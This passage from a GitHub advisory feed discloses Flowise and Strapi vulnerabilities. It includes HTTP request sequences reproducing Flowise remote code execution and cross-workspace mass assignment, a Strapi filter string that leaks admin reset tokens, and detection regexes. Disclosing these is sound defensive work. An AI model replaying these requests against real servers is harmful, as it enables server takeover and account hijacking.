<img width="1280" height="570" alt="ea354264cbb2ace6a3a6a16e00f1d298" src="https://github.com/user-attachments/assets/9ca88790-77ea-4d42-8910-09e4453f981a">

<p>Therefore, the limitation of this function can be bypassed by starting with //</p>
<p>** Reproduction process: **</p>
<p>Create a new chatflow as follows:</p>
<img width="1280" height="716" alt="7e884613b5897509b39467f8f3b7aae1" src="https://github.com/user-attachments/assets/478c7a89-4e77-4a5d-b063-de16cb640f92">

<p>After saving, cmd.js will be uploaded to the ~/.flowise/storage/{orgId}/{chatflow_id}/ directory</p>
<p>orgId can be obtained during login, and chatflow_id will also be returned when saving chatflow:</p>
<img width="1280" height="702" alt="48b5ab8412babba312f502be5db1dad3" src="https://github.com/user-attachments/assets/090292cf-6361-43cd-91d7-eec6e578255b">

<p>For example: </p>
<pre><code>~/.flowise/storage/d2312f99-9043-413a-a1d2-3b7685a132b2/f8cc7f34-a1e5-4180-940a-47306d32adc2/cmd.js
</code></pre>
<p>Since paths like ~/ are restricted, and an absolute path needs to be obtained, use the following method:</p>
<img width="1280" height="716" alt="990e1c81ed3957c5ae823e55efec15a5" src="https://github.com/user-attachments/assets/02c2a949-559a-4ee4-9675-c50a203d1e99">

<pre><code>POST /api/v1/export-import/import  HTTP/1.1
Host: 127.0.0.1:3000
Content-Type: application/json
x-request-from: internal
Cookie: cookie
Connection: keep-alive
Content-Length: 479

 {
    "ChatMessage": [
      {
        "id": "11111111-2222-4333-8444-555555555555",
        "role": "userMessage",
        "chatflowid": "{chatflow_id}",
        "content": "seed for home path test",
        "chatType": "EXTERNAL",
        "chatId": "audit-home-001",
        "createdDate": "2026-03-04T06:40:00.000Z",
        "fileUploads": "[{\"type\":\"stored-file\",\"name\":\"poc.txt\",\"mime\":\"text/plain\"}]"
      }
    ]
  }
</code></pre>
<img width="1280" height="748" alt="d7f947940f4e6b6e95a61bcc301c25c0" src="https://github.com/user-attachments/assets/482fb78c-dbc8-4a0d-a042-4c993e976f10">

<pre><code>POST /api/v1/export-import/chatflow-messages HTTP/1.1
Host: 127.0.0.1:3000
Content-Type: application/json
x-request-from: internal
Cookie: cookie
Connection: keep-alive
Content-Length: 57

{"chatflowId":"{chatflow_id}"}
</code></pre>
<p>After obtaining the absolute path, simply modify the path in args to the path of the file name: </p>
<pre><code>  {
    "command": "node",
    "args": ["//root/.flowise/storage/d2312f99-9043-413a-a1d2-3b7685a132b2/f8cc7f34-a1e5-4180-940a-47306d32adc2/cmd.js"]
  }
</code></pre>
<p>After saving, execution will trigger RCE </p>
<pre><code>POST /api/v1/prediction/{chatflows_id} HTTP/1.1
Host: 127.0.0.1:3000
Content-Type: application/json
Authorization: Bearer apikey
Content-Length: 17

{"question": "1"}
</code></pre>
<h2 id="impact">Impact</h2>
<p>This vulnerability allows attackers to execute arbitrary commands on the Flowise server .</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-m99r-2hxc-cp3q">https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-m99r-2hxc-cp3q</a></li>
<li><a href="https://github.com/FlowiseAI/Flowise/releases/tag/flowise%403.1.2">https://github.com/FlowiseAI/Flowise/releases/tag/flowise%403.1.2</a></li>
<li><a href="https://github.com/advisories/GHSA-m99r-2hxc-cp3q">https://github.com/advisories/GHSA-m99r-2hxc-cp3q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m99r-2hxc-cp3q</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-14T14:57:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[flowise] FlowiseAI Exposes Basic Auth Credentials via API]]></title>
        <id>https://github.com/advisories/GHSA-php6-83fg-gw3g</id>
        <link href="https://github.com/advisories/GHSA-php6-83fg-gw3g"/>
        <updated>2026-05-14T14:54:48.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Detection Method:</strong> Kolega.dev Deep Code Scan</p>
<table>
<thead>
<tr>
<th>Attribute</th>
<th>Value</th>
</tr>
</thead>
<tbody><tr>
<td>Severity</td>
<td>Medium</td>
</tr>
<tr>
<td>CWE</td>
<td>CWE-522 (Insufficiently Protected Credentials)</td>
</tr>
<tr>
<td>Location</td>
<td>packages/server/src/enterprise/controllers/account.controller.ts:128-135</td>
</tr>
<tr>
<td>Practical Exploitability</td>
<td>Medium</td>
</tr>
<tr>
<td>Developer Approver</td>
<td><a href="mailto:faizan@kolega.ai">faizan@kolega.ai</a></td>
</tr>
</tbody></table>
<h3 id="description">Description</h3>
<p>The checkBasicAuth endpoint validates credentials in plaintext without rate limiting and with direct comparison.</p>
<h3 id="affected-code">Affected Code</h3>
<pre><code>public async checkBasicAuth(req: Request, res: Response) {
    const { username, password } = req.body
    if (username === process.env.FLOWISE_USERNAME &amp;&amp; password === process.env.FLOWISE_PASSWORD) {
        return res.json({ message: 'Authentication successful' })
</code></pre>
<h3 id="evidence">Evidence</h3>
<p>Credentials are sent in plaintext in request body and compared directly without hashing. No rate limiting prevents brute force attacks. The endpoint returns different messages for success/failure, enabling enumeration.</p>
<h3 id="impact">Impact</h3>
<p>Credential brute-forcing - attackers can attempt unlimited username/password combinations against the basic auth system. Successful attacks grant access to the application.</p>
<h3 id="recommendation">Recommendation</h3>
<ol>
<li>Implement rate limiting on this endpoint, 2) Use constant-time comparison to prevent timing attacks, 3) Consider using hashed comparison, 4) Return generic error messages, 5) Add logging for failed attempts.</li>
</ol>
<h3 id="notes">Notes</h3>
<p>The checkBasicAuth endpoint at line 128-135 has multiple security issues: (1) No rate limiting - the RateLimiterManager only applies to chatflow-specific endpoints, not auth endpoints. Attackers can perform unlimited brute force attempts. (2) Uses JavaScript === operator for comparison which is not constant-time, potentially enabling timing attacks. (3) Returns different messages for success ('Authentication successful') vs failure ('Authentication failed'), enabling credential enumeration. The endpoint compares plaintext credentials against environment variables FLOWISE_USERNAME and FLOWISE_PASSWORD. While this is basic auth for simpler deployments, the lack of rate limiting makes it actively exploitable for credential brute-forcing.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-php6-83fg-gw3g">https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-php6-83fg-gw3g</a></li>
<li><a href="https://github.com/FlowiseAI/Flowise/releases/tag/flowise%403.1.2">https://github.com/FlowiseAI/Flowise/releases/tag/flowise%403.1.2</a></li>
<li><a href="https://github.com/advisories/GHSA-php6-83fg-gw3g">https://github.com/advisories/GHSA-php6-83fg-gw3g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-php6-83fg-gw3g</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-14T14:54:46.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[flowise] FlowiseAI has Mass Assignment in Chatflow Update Endpoint that Allows Cross-Workspace AgentFlow Reassignment]]></title>
        <id>https://github.com/advisories/GHSA-5wxp-qjgq-fx6m</id>
        <link href="https://github.com/advisories/GHSA-5wxp-qjgq-fx6m"/>
        <updated>2026-05-14T14:54:29.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A Mass Assignment vulnerability exists in the chatflow update endpoint of FlowiseAI.</p>
<p>The endpoint allows clients to modify server-controlled properties such as deployed, isPublic, workspaceId, createdDate, and updatedDate when updating a chatflow object.</p>
<p>Due to missing server-side validation and authorization checks, an authenticated user can manipulate internal attributes of a chatflow and reassign it to another workspace. This allows cross-workspace resource reassignment and unauthorized modification of deployment and visibility settings.</p>
<h3 id="details">Details</h3>
<p>The endpoint responsible for updating chatflows:</p>
<p><strong>PUT /api/v1/chatflows/{chatflowId}</strong></p>
<p>accepts a JSON request body containing the chatflow configuration (flowData) along with other metadata fields.</p>
<p>However, the server does not restrict which properties may be modified by the client. As a result, user-controlled request bodies can include additional fields that should normally be controlled only by the backend.</p>
<p>Examples of server-controlled fields that can be manipulated include:</p>
<ol>
<li>deployed</li>
<li>isPublic</li>
<li>workspaceId</li>
<li>createdDate</li>
<li>updatedDate</li>
<li>category</li>
<li>type</li>
</ol>
<p>These fields appear to be directly mapped to the underlying database entity when processing the update request, suggesting that the server performs a direct merge of the request body into the chatflow model without applying a strict DTO whitelist or authorization checks.</p>
<p>For example, modifying the request body with:</p>
<pre><code class="language-json">{
  "deployed": true,
  "isPublic": true,
  "createdDate": "1999-03-06T10:59:32.000Z",
  "updatedDate": "1999-03-06T13:21:34.000Z",
  "workspaceId": "11111111-2222-3333-4444-555555555555"
}
</code></pre>
<p>results in the server accepting and persisting these values.</p>
<p>In testing, a second workspace was created in the database and the workspaceId field was successfully modified through the API request. The chatflow was reassigned to the attacker-controlled workspace, confirming that the application does not enforce workspace ownership validation.</p>
<h3 id="poc">PoC</h3>
<p>Authenticate to the Flowise interface.</p>
<p>Capture the request used to update a chatflow:</p>
<pre><code class="language-http">PUT /api/v1/chatflows/&lt;CHATFLOW_ID&gt;
Content-Type: application/json

Modify the request body by injecting additional fields:

{
  "name": "test-flow",
  "flowData": "{...}",
  "deployed": true,
  "isPublic": true,
  "workspaceId": "11111111-2222-3333-4444-555555555555"
}
</code></pre>
<p>Send the request.</p>
<p>Observe that the response returns the manipulated values:</p>
<pre><code class="language-json">{
  "deployed": true,
  "isPublic": true,
  "workspaceId": "11111111-2222-3333-4444-555555555555"
}
</code></pre>
<p>Verify in the database that the chatflow has been reassigned:</p>
<pre><code class="language-sql">SELECT id, workspaceId FROM chat_flow WHERE id='&lt;CHATFLOW_ID&gt;';
</code></pre>
<p>The workspaceId value reflects the attacker-supplied workspace.</p>
<h3 id="impact">Impact</h3>
<p>This vulnerability allows authenticated users to manipulate server-controlled attributes of chatflows.</p>
<p>Confirmed impacts include:</p>
<ul>
<li>Unauthorized modification of chatflow visibility (isPublic)</li>
<li>Unauthorized deployment state changes (deployed)</li>
<li>Cross-workspace reassignment of chatflows (workspaceId)</li>
<li>Unauthorized modification of metadata (createdDate, updatedDate)</li>
</ul>
<p>In multi-tenant environments, this allows an attacker to move chatflows between workspaces without authorization, breaking tenant isolation boundaries.</p>
<p>This may enable:</p>
<ul>
<li>Cross-workspace workflow takeover</li>
<li>Unauthorized exposure of private workflows</li>
<li>Manipulation of deployed agent workflows</li>
</ul>
<p>The issue stems from missing authorization checks and improper handling of client-controlled input in the chatflow update endpoint.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-5wxp-qjgq-fx6m">https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-5wxp-qjgq-fx6m</a></li>
<li><a href="https://github.com/FlowiseAI/Flowise/releases/tag/flowise%403.1.2">https://github.com/FlowiseAI/Flowise/releases/tag/flowise%403.1.2</a></li>
<li><a href="https://github.com/advisories/GHSA-5wxp-qjgq-fx6m">https://github.com/advisories/GHSA-5wxp-qjgq-fx6m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5wxp-qjgq-fx6m</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-14T14:54:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[flowise] FlowiseAI has Mass Assignment in Tool Update Endpoint that Allows Cross-Workspace Resource Reassignment]]></title>
        <id>https://github.com/advisories/GHSA-x5v6-pj28-cwwm</id>
        <link href="https://github.com/advisories/GHSA-x5v6-pj28-cwwm"/>
        <updated>2026-05-14T14:52:41.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A Mass Assignment vulnerability exists in the tool update endpoint of FlowiseAI.</p>
<p>The endpoint allows authenticated users to modify server-controlled properties such as workspaceId, createdDate, and updatedDate when updating a tool resource.</p>
<p>Due to missing server-side validation and authorization checks, an attacker can manipulate the workspaceId field and reassign tools to arbitrary workspaces. This breaks tenant isolation in multi-workspace environments.</p>
<h3 id="details">Details</h3>
<p>The endpoint responsible for updating tools:</p>
<p><strong>PUT /api/v1/tools/{toolId}</strong></p>
<p>accepts a JSON request body containing tool metadata.</p>
<p>However, the server does not restrict which properties may be modified by the client. As a result, user-controlled request bodies can include additional fields that should normally be controlled only by the backend.</p>
<p>Server-controlled fields that can be manipulated include:</p>
<ol>
<li>workspaceId</li>
<li>createdDate</li>
<li>updatedDate</li>
</ol>
<p>The request body is directly merged into the underlying database entity without proper DTO validation or authorization checks.</p>
<h3 id="poc">PoC</h3>
<p>Authenticate to the Flowise interface.</p>
<p>Capture the request used to update a tool:</p>
<pre><code class="language-http">PUT /api/v1/tools/&lt;TOOL_ID&gt;
Content-Type: application/json

Modify the request body by injecting additional fields:

{
  "name": "aaa",
  "description": "bbb",
  "color": "linear-gradient(rgb(109,215,45), rgb(136,170,134))",
  "schema": "[]",
  "func": "",
  "iconSrc": "test",
  "workspaceId": "11111111-2222-3333-4444-555555555555",
  "createdDate": "1995-03-06T14:17:50.000Z",
  "updatedDate": "1995-03-06T14:17:50.000Z"
}
</code></pre>
<p>Send the request.</p>
<p>Observe that the response includes the manipulated fields:</p>
<pre><code class="language-json">{
  "workspaceId": "11111111-2222-3333-4444-555555555555",
  "createdDate": "1995-03-06T14:17:50.000Z"
}
</code></pre>
<p>This confirms that client-controlled values are accepted and persisted by the server.</p>
<h3 id="impact">Impact</h3>
<p>This vulnerability allows authenticated users to manipulate internal attributes of tool resources.</p>
<p>Confirmed impacts include:</p>
<ul>
<li>Cross-workspace reassignment of tools (workspaceId)</li>
<li>Unauthorized modification of metadata (createdDate, updatedDate)</li>
</ul>
<p>In multi-tenant deployments, this may allow an attacker to move tools between workspaces without authorization, breaking tenant isolation boundaries.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-x5v6-pj28-cwwm">https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-x5v6-pj28-cwwm</a></li>
<li><a href="https://github.com/FlowiseAI/Flowise/releases/tag/flowise%403.1.2">https://github.com/FlowiseAI/Flowise/releases/tag/flowise%403.1.2</a></li>
<li><a href="https://github.com/advisories/GHSA-x5v6-pj28-cwwm">https://github.com/advisories/GHSA-x5v6-pj28-cwwm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x5v6-pj28-cwwm</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-14T14:52:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[flowise] FlowiseAI has Mass Assignment in Variable Update Endpoint that Allows Cross-Workspace Resource Reassignment]]></title>
        <id>https://github.com/advisories/GHSA-6fw7-3q8r-m5vj</id>
        <link href="https://github.com/advisories/GHSA-6fw7-3q8r-m5vj"/>
        <updated>2026-05-14T14:52:25.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A Mass Assignment vulnerability exists in the variable update endpoint of FlowiseAI.</p>
<p>The endpoint allows authenticated users to modify server-controlled properties such as workspaceId, createdDate, and updatedDate when updating a variable resource.</p>
<p>Due to missing server-side validation and authorization checks, an attacker can manipulate the workspaceId field and reassign variables to arbitrary workspaces.</p>
<p>This behavior may break tenant isolation in multi-workspace environments.</p>
<h3 id="details">Details</h3>
<p>The endpoint responsible for updating variables:</p>
<p><strong>PUT /api/v1/variables/{variableId}</strong></p>
<p>accepts a JSON request body containing the variable definition.</p>
<p>However, the backend does not restrict which attributes can be modified by the client. As a result, user-controlled request bodies can include internal properties that should normally be controlled exclusively by the server.</p>
<p>Server-controlled fields that can be manipulated include:</p>
<ul>
<li>workspaceId</li>
<li>createdDate</li>
<li>updatedDate</li>
</ul>
<p>These fields appear to be directly mapped to the database entity without strict input validation or authorization checks.</p>
<p>For example, the following request body was accepted by the server:</p>
<pre><code class="language-json">{
  "name": "aaa",
  "value": "bbbe",
  "type": "static",
  "createdDate": "2016-03-06T17:59:30.000Z",
  "updatedDate": "2016-03-06T18:00:17.000Z",
  "workspaceId": "11111111-2222-3333-4444-555555555555"
}
</code></pre>
<p>The server accepted the attacker-controlled workspaceId and metadata fields and persisted them.</p>
<h3 id="poc">PoC</h3>
<p><strong>Request</strong></p>
<pre><code class="language-http">PUT /api/v1/variables/&lt;VARIABLE_ID&gt;
Content-Type: application/json

{
  "name": "aaa",
  "value": "bbbe",
  "type": "static",
  "createdDate": "2016-03-06T17:59:30.000Z",
  "updatedDate": "2016-03-06T18:00:17.000Z",
  "workspaceId": "11111111-2222-3333-4444-555555555555"
}
</code></pre>
<p><strong>Response</strong></p>
<pre><code class="language-json">{
  "id": "0a2b9f61-4a97-4ff8-b80d-00275ed18674",
  "name": "aaa",
  "value": "bbbe",
  "type": "static",
  "createdDate": "2016-03-06T17:59:30.000Z",
  "updatedDate": "2026-03-06T18:05:17.000Z",
  "workspaceId": "11111111-2222-3333-4444-555555555555"
}
</code></pre>
<p>This confirms that the backend accepts and persists attacker-controlled internal properties.</p>
<h3 id="impact">Impact</h3>
<p>This vulnerability allows authenticated users to manipulate internal attributes of variable resources.</p>
<p>Possible impacts include:</p>
<ol>
<li>Cross-workspace reassignment of variables (workspaceId)</li>
<li>Unauthorized modification of metadata (createdDate, updatedDate)</li>
<li>Potential tenant isolation bypass in multi-workspace deployments</li>
</ol>
<p>In multi-tenant environments, this may allow an attacker to move variables between workspaces without authorization.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-6fw7-3q8r-m5vj">https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-6fw7-3q8r-m5vj</a></li>
<li><a href="https://github.com/FlowiseAI/Flowise/releases/tag/flowise%403.1.2">https://github.com/FlowiseAI/Flowise/releases/tag/flowise%403.1.2</a></li>
<li><a href="https://github.com/advisories/GHSA-6fw7-3q8r-m5vj">https://github.com/advisories/GHSA-6fw7-3q8r-m5vj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6fw7-3q8r-m5vj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-14T14:52:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@strapi/strapi] Strapi may leak sensitive data via relational filtering due to lack of query sanitization]]></title>
        <id>https://github.com/advisories/GHSA-rjg2-95x7-8qmx</id>
        <link href="https://github.com/advisories/GHSA-rjg2-95x7-8qmx"/>
        <updated>2026-05-14T13:17:59.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary-of-cve-2026-27886-vulnerability-details">Summary of CVE-2026-27886 Vulnerability Details</h3>
<ul>
<li>CVE: CVE-2026-27886</li>
<li>CVSS v3.1 Vector: <code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:H/SI:N/SA:N</code> (9.3 — Critical)</li>
<li>Affected Versions: <code>@strapi/strapi</code> &lt;=5.36.1</li>
<li>How to Patch: Immediately update your Strapi to &gt;=5.37.0</li>
</ul>
<h3 id="description-of-cve-2026-27886">Description of CVE-2026-27886</h3>
<p>Strapi versions prior to 5.37.0 did not sufficiently sanitize query parameters when filtering content via relational fields. An unauthenticated attacker could use the <code>where</code> query parameter on any publicly-accessible content-type with an <code>updatedBy</code> (or other admin-relation) field to perform a boolean-oracle attack against private fields on the joined <code>admin_users</code> table, including the <code>resetPasswordToken</code> field. Extracting an admin reset token via this oracle made full administrative account takeover possible without authentication.</p>
<p>When a filter such as <code>where[updatedBy][resetPasswordToken][$startsWith]=a</code> was applied to a public Content API endpoint, the underlying query generation performed a <code>LEFT JOIN</code> against the <code>admin_users</code> table and emitted a <code>WHERE</code> clause referencing the joined column. The query parameter sanitization layer did not block operator chains that traversed into relational target schemas the caller had no read permission on, allowing the response count to be used as a one-bit oracle on any admin-table field.</p>
<p>The patch introduces explicit query-parameter sanitization at the controller and service boundary via three new primitives: <code>strictParam</code>, <code>addQueryParams</code>, and <code>addBodyParams</code>. Operator chains that traverse into restricted relational targets are now rejected before reaching the database.</p>
<h3 id="iocs-for-cve-2026-27886">IoC's for CVE-2026-27886</h3>
<p>Indicators that an instance running an unpatched version may have been exploited:</p>
<ul>
<li>Server access logs containing query strings traversing into admin-relation private fields. Regex: <code>\?(.*&amp;)?where\[(updatedBy|createdBy|publishedBy)\]\[(email|password|resetPasswordToken|confirmationToken|firstname|lastname|preferedLanguage)\]\[\$(startsWith|contains|eq|gt|lt|ge|le|in|notIn|notNull|null)\]=</code></li>
<li>High volume of public Content API requests from a single IP iterating through a hex alphabet (<code>0</code>-<code>9</code>, <code>a</code>-<code>f</code>) on the same content-type endpoint with progressively-longer filter values</li>
<li>Subsequent <code>POST /admin/reset-password</code> calls using a reset token that the legitimate admin did not request</li>
<li>Successful admin password change immediately following a burst of public Content API requests with <code>where[updatedBy]</code> query parameters</li>
<li>Sustained burst of identical-shape requests with only the trailing character of the filter value varying</li>
</ul>
<h3 id="credit">Credit</h3>
<p>Discovered by: James Doll - WildWest CyberSecurity
Contact: <a href="mailto:cve+2026-27886@wildwestcyber.com">cve+2026-27886@wildwestcyber.com</a>
Website: <a href="https://wildwestcyber.com">https://wildwestcyber.com</a>
LinkedIn: <a href="https://www.linkedin.com/in/james-doll-273a61243">https://www.linkedin.com/in/james-doll-273a61243</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/strapi/strapi/security/advisories/GHSA-rjg2-95x7-8qmx">https://github.com/strapi/strapi/security/advisories/GHSA-rjg2-95x7-8qmx</a></li>
<li><a href="https://github.com/advisories/GHSA-rjg2-95x7-8qmx">https://github.com/advisories/GHSA-rjg2-95x7-8qmx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rjg2-95x7-8qmx</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-05-14T13:17:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@strapi/upload] Strapi Upload Plugin MIME Validation Bypass via Content API]]></title>
        <id>https://github.com/advisories/GHSA-pcw7-5633-82vv</id>
        <link href="https://github.com/advisories/GHSA-pcw7-5633-82vv"/>
        <updated>2026-05-14T13:12:57.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary-of-cve-2026-22707-vulnerability-details">Summary of CVE-2026-22707 Vulnerability Details</h3>
<ul>
<li>CVE: CVE-2026-22707</li>
<li>CVSS v3.1 Vector: <code>CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N</code> (5.3 — Medium)</li>
<li>Affected Versions: <code>@strapi/upload</code> &lt;=5.33.2</li>
<li>How to Patch: Immediately update your Strapi to &gt;=5.33.3</li>
</ul>
<h3 id="description-of-cve-2026-22707">Description of CVE-2026-22707</h3>
<p>In Strapi versions prior to 5.33.3, the Upload plugin's Content API endpoints did not enforce the administrator-configured MIME type restrictions (<code>plugin.upload.security.allowedTypes</code> and <code>deniedTypes</code>). The same restrictions were correctly enforced on the Admin Panel upload path.</p>
<p>The upload plugin's <code>enforceUploadSecurity</code> security check was invoked in the admin upload controller but was missing from the Content API controller. The Content API handlers <code>uploadFiles</code> and <code>replaceFile</code> (and the <code>upload</code> wrapper that dispatches to them) called the underlying upload service directly, bypassing both the magic-byte MIME detection and the configured allow/deny lists.</p>
<p>An authenticated user with the Content API upload permission could therefore upload file types the administrator had explicitly disallowed, including HTML and SVG content. In deployments serving uploaded files from the same origin as the admin panel (default), an attacker could upload an HTML or SVG file that, when opened directly by an admin, executed JavaScript in the admin origin, enabling admin-session hijack and authenticated administrative actions against the admin API.</p>
<p>The patch introduces a shared <code>prepareUploadRequest</code> helper that wraps <code>enforceUploadSecurity</code> and is called from both the Content API and admin upload controllers, ensuring identical security policy enforcement on every upload entry point.</p>
<h3 id="iocs-for-cve-2026-22707">IoC's for CVE-2026-22707</h3>
<p>Indicators that an instance running an unpatched version may have been exploited:</p>
<ul>
<li>Files in <code>/uploads/</code> with extensions outside the configured allow-list, particularly <code>.html</code>, <code>.htm</code>, <code>.svg</code>, <code>.js</code>, <code>.mjs</code>, <code>.xml</code>, or <code>.xhtml</code>. Filesystem regex: <code>\.(html?|svg|m?js|x?html|xml)$</code></li>
<li>Successful 201 responses from <code>POST /api/upload</code> where the uploaded file's MIME or extension is outside the configured <code>allowedTypes</code></li>
<li>Server access logs showing non-administrator users uploading files with executable web content types. Content-Type regex: <code>text/html|application/javascript|image/svg\+xml</code></li>
<li>Admin browsing logs (X-Forwarded-For, User-Agent) opening files under <code>/uploads/*.html</code> or <code>/uploads/*.svg</code> shortly before unexpected administrative actions (user creation, role changes, permission modifications)</li>
</ul>
<h2 id="references">References</h2>
<ul>
<li><strong>CWE-693</strong>: Protection Mechanism Failure</li>
<li><strong>CWE-434</strong>: Unrestricted Upload of File with Dangerous Type</li>
<li><strong>OWASP</strong>: Unrestricted File Upload</li>
<li><a href="https://docs.strapi.io/cms/features/media-library">Strapi 5 Documentation - Media Library</a></li>
<li><a href="https://github.com/strapi/strapi/security/policy">Strapi Security Policy</a></li>
</ul>
<h2 id="credits">Credits</h2>
<p>Reported independently by:</p>
<ul>
<li>@kaminuma (initial report, 2026-01-09)</li>
<li>@arkmarta (concurrent report, 2026-01-13 — originally filed as GHSA-r7hp-523c-r8wr, closed as duplicate)</li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/strapi/strapi/security/advisories/GHSA-pcw7-5633-82vv">https://github.com/strapi/strapi/security/advisories/GHSA-pcw7-5633-82vv</a></li>
<li><a href="https://github.com/advisories/GHSA-pcw7-5633-82vv">https://github.com/advisories/GHSA-pcw7-5633-82vv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pcw7-5633-82vv</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-14T13:12:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@strapi/plugin-users-permissions] Strapi: Password Reset Does Not Revoke Existing Refresh Sessions]]></title>
        <id>https://github.com/advisories/GHSA-hvp3-26wx-g2w4</id>
        <link href="https://github.com/advisories/GHSA-hvp3-26wx-g2w4"/>
        <updated>2026-05-14T14:58:06.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary-of-cve-2026-22706-vulnerability-details">Summary of CVE-2026-22706 Vulnerability Details</h3>
<ul>
<li>CVE: CVE-2026-22706</li>
<li>CVSS v3.1 Vector: <code>CVSS:4.0/AV:N/AC:H/AT:N/PR:H/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N</code> (2.1 — Low)</li>
<li>Affected Versions: <code>@strapi/admin</code> and <code>@strapi/plugin-users-permissions</code> &lt;=5.33.2</li>
<li>How to Patch: Immediately update your Strapi to &gt;=5.33.3</li>
</ul>
<h3 id="description-of-cve-2026-22706">Description of CVE-2026-22706</h3>
<p>In Strapi versions prior to 5.33.3, changing or resetting a user's password did not invalidate the user's existing refresh-token sessions by default. The refresh-token invalidation step in the users-permissions and admin authentication controllers was conditional on a caller-supplied <code>deviceId</code>. When a password change or reset request did not include a <code>deviceId</code>, no refresh tokens were revoked, leaving every prior session active.</p>
<p>An attacker who had previously obtained a refresh token could continue minting new access tokens after the legitimate user reset their password, allowing persistent unauthorized access for the lifetime of the refresh token (up to 30 days by default). Rotating credentials no longer terminated an active attacker session, defeating password reset as a containment measure.</p>
<p>The patch invalidates all refresh tokens associated with the user on every password change and password reset, regardless of whether a <code>deviceId</code> is supplied. A new device-scoped session is then issued to the caller as part of the response.</p>
<h3 id="iocs-for-cve-2026-22706">IoC's for CVE-2026-22706</h3>
<p>Indicators that an instance running an unpatched version may have been exploited:</p>
<ul>
<li>Successful <code>POST /api/auth/refresh</code> or <code>POST /admin/access-token</code> requests using a refresh token issued before the user's most recent password change. Reviewable by correlating refresh-token <code>iat</code> claims against password-change events in audit logs</li>
<li>New access-token issuances for a user whose password was reset within the past 30 days, originating from an IP or User-Agent that did not perform the reset</li>
<li>Multiple active refresh tokens for a single user across distinct IPs after a password reset event</li>
<li>Database query: rows in <code>strapi_session</code> with <code>created_at</code> earlier than the user's most recent password-reset timestamp and <code>status = 'active'</code></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li>OWASP ASVS 4.0 – V2.1.1: Session invalidation on credential change</li>
<li>OWASP Top 10 – A2: Broken Authentication</li>
</ul>
<h3 id="credits">Credits</h3>
<ul>
<li>bugbunny.ai</li>
<li>AndyAnh174 (concurrent report, 2026-04-09 — originally filed as GHSA-c6gj-8rxm-jrf2, closed as duplicate)</li>
<li>Aastha2602 (concurrent report, 2026-03-10 — originally filed as GHSA-5qvg-4jch-gvf4, closed as duplicate)</li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/strapi/strapi/security/advisories/GHSA-hvp3-26wx-g2w4">https://github.com/strapi/strapi/security/advisories/GHSA-hvp3-26wx-g2w4</a></li>
<li><a href="https://github.com/advisories/GHSA-hvp3-26wx-g2w4">https://github.com/advisories/GHSA-hvp3-26wx-g2w4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hvp3-26wx-g2w4</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-05-13T20:02:42.000Z</published>
    </entry>
    <entry>
